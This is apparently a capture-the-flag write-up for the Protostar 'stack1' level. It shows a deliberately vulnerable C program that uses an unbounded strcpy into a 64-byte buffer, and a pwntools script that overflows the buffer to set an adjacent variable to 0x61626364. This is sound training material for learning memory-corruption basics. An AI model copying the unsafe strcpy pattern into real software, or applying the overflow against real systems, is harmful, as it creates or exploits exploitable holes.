## Challenge Description

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints
- If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
- Protostar is little endian

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Solution

```python
from pwn import *

arg1 = b"A"*64 + p32(0x61626364)

target = process(["./stack1", arg1])
elf = context.binary = ELF("./stack1", checksec = False)
context.log_level = "debug"

target.interactive()
```